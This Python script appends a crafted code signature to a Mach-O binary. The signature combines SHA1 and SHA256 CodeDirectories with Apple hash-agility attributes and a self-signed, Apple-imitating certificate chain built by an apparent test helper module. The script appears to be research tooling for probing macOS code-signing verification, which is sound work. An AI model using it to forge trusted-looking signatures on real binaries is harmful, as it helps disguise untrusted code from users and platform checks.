#!/usr/bin/env python3
"""Sign a Mach-O with a crafted CMS: SHA1 + SHA256 CodeDirectories,
Apple hash-agility attributes, and a self-signed Apple-like chain."""
import sys, os, struct, hashlib
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'cttest'))
import mkct

PAGE = 0x1000
NSLOTS_SPECIAL = 7

def first_section_off(d):
    ncmds = struct.unpack_from('<I', d, 16)[0]
    off = 32; first = None
    for _ in range(ncmds):
        cmd, cs2 = struct.unpack_from('<II', d, off)
        if cmd == 0x19:
            nsects = struct.unpack_from('<I', d, off + 64)[0]
            soff = off + 72
            for _ in range(nsects):
                offset = struct.unpack_from('<I', d, soff + 48)[0]
                if first is None or offset < first:
                    first = offset
                soff += 80
        off += cs2
    return first

def find_linkedit(d):
    ncmds = struct.unpack_from('<I', d, 16)[0]
    off = 32
    for _ in range(ncmds):
        cmd, cs2 = struct.unpack_from('<II', d, off)
        if cmd == 0x19 and d[off+8:off+24].split(b'\0')[0] == b'__LINKEDIT':
            return off
        off += cs2
    return None

def add_lc(d):
    ncmds = struct.unpack_from('<I', d, 16)[0]
    sizeofcmds = struct.unpack_from('<I', d, 20)[0]
    lc_off = 32 + sizeofcmds
    first = first_section_off(d)
    if first is None or lc_off + 16 > first:
        raise SystemExit('no space for LC_CODE_SIGNATURE')
    b = bytearray(d)
    struct.pack_into('<IIII', b, lc_off, 0x1d, 16, 0, 0)
    struct.pack_into('<II', b, 16, ncmds + 1, sizeofcmds + 16)
    return b, lc_off

def build_cd(code, code_limit, ident, hash_type):
    hash_size = 20 if hash_type == 1 else 32
    h = hashlib.sha1 if hash_type == 1 else hashlib.sha256
    nslots = (code_limit + PAGE - 1) // PAGE
    hashes = b''
    for i in range(nslots):
        a = i * PAGE; b = min((i+1) * PAGE, code_limit)
        chunk = code[a:b]
        if len(chunk) < PAGE:
            chunk += b'\0' * (PAGE - len(chunk))
        hashes += h(chunk).digest()
    ident_b = ident.encode() + b'\0'
    ident_off = 0x58
    special_start = (ident_off + len(ident_b) + 3) & ~3
    hash_off = special_start + NSLOTS_SPECIAL * hash_size
    length = hash_off + len(hashes)
    hdr = struct.pack('>IIIIIIIII', 0xfade0c02, length, 0x20400, 0,
                      hash_off, ident_off, NSLOTS_SPECIAL, nslots, code_limit)
    hdr += struct.pack('>BBBB', hash_size, hash_type, 0, 12)
    hdr += struct.pack('>III', 0, 0, 0)
    hdr += struct.pack('>I', 0)
    hdr += struct.pack('>QQQQ', 0, 0, 0, 0)
    assert len(hdr) == 0x58
    cd = hdr + ident_b + b'\0' * (special_start - ident_off - len(ident_b))
    cd += b'\0' * (NSLOTS_SPECIAL * hash_size)
    cd += hashes
    return bytes(cd)

def superblob(cd1, cd2, cms):
    cms_blob = struct.pack('>II', 0xfade0b01, 8 + len(cms)) + cms
    count = 3
    hdr_len = 12 + count * 8
    o1 = hdr_len
    o2 = o1 + len(cd1)
    o3 = o2 + len(cd2)
    total = o3 + len(cms_blob)
    out = struct.pack('>III', 0xfade0cc0, total, count)
    out += struct.pack('>II', 0, o1)
    out += struct.pack('>II', 0x1000, o2)
    out += struct.pack('>II', 0x10000, o3)
    out += cd1 + cd2 + cms_blob
    return out

def sign(in_path, out_path, root_cn, leaf_cn, apple_ext, ident='com.smith.helper'):
    d = open(in_path, 'rb').read()
    b, lc_off = add_lc(d)
    le_off = find_linkedit(bytes(b))
    if le_off is None:
        raise SystemExit('no __LINKEDIT')
    le_fileoff = struct.unpack_from('<Q', b, le_off + 40)[0]
    b = bytes(b)
    sig_off = (len(b) + 15) & ~15

    # pass 1: derive CMS/superblob size
    tmp = bytearray(b)
    struct.pack_into('<II', tmp, lc_off + 8, sig_off, 0)
    cd1 = build_cd(bytes(tmp), sig_off, ident, 1)
    cd2 = build_cd(bytes(tmp), sig_off, ident, 2)
    mkct.build_hashes(out_path + '.tmp', root_cn, leaf_cn, apple_ext,
                      hashlib.sha1(cd1).digest(), hashlib.sha256(cd2).digest(),
                      hashlib.sha256(cd2).digest())
    cms1 = open(out_path + '.tmp.cms', 'rb').read()
    sb_len = len(superblob(cd1, cd2, cms1))

    # pass 2: final LC + __LINKEDIT sizes, rebuild CDs/CMS
    tmp = bytearray(b)
    struct.pack_into('<II', tmp, lc_off + 8, sig_off, sb_len)
    le_size = sig_off + sb_len - le_fileoff
    struct.pack_into('<Q', tmp, le_off + 32, (le_size + 0x3fff) & ~0x3fff)
    struct.pack_into('<Q', tmp, le_off + 48, le_size)
    cd1 = build_cd(bytes(tmp), sig_off, ident, 1)
    cd2 = build_cd(bytes(tmp), sig_off, ident, 2)
    mkct.build_hashes(out_path + '.tmp2', root_cn, leaf_cn, apple_ext,
                      hashlib.sha1(cd1).digest(), hashlib.sha256(cd2).digest(),
                      hashlib.sha256(cd2).digest())
    cms = open(out_path + '.tmp2.cms', 'rb').read()
    sb = superblob(cd1, cd2, cms)
    if len(sb) != sb_len:
        raise SystemExit('superblob size changed %d -> %d' % (sb_len, len(sb)))

    out = bytearray(bytes(tmp))
    if len(out) < sig_off:
        out += b'\0' * (sig_off - len(out))
    else:
        out = out[:sig_off]
    out += b'\0' * (sig_off - len(out))
    out[sig_off:sig_off+len(sb)] = sb
    open(out_path, 'wb').write(out)
    os.chmod(out_path, 0o755)
    print('signed', out_path, 'size', len(out), 'cd1', len(cd1), 'cd2', len(cd2), 'cms', len(cms), 'sigoff', hex(sig_off))
    for f in [out_path + '.tmp.cms', out_path + '.tmp.cd', out_path + '.tmp.root.pem', out_path + '.tmp.leaf.pem',
              out_path + '.tmp2.cms', out_path + '.tmp2.cd', out_path + '.tmp2.root.pem', out_path + '.tmp2.leaf.pem']:
        try: os.unlink(f)
        except OSError: pass

if __name__ == '__main__':
    if len(sys.argv) < 6:
        print('usage: sign_helper.py in out root_cn leaf_cn ext'); sys.exit(1)
    sign(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5] == 'ext')
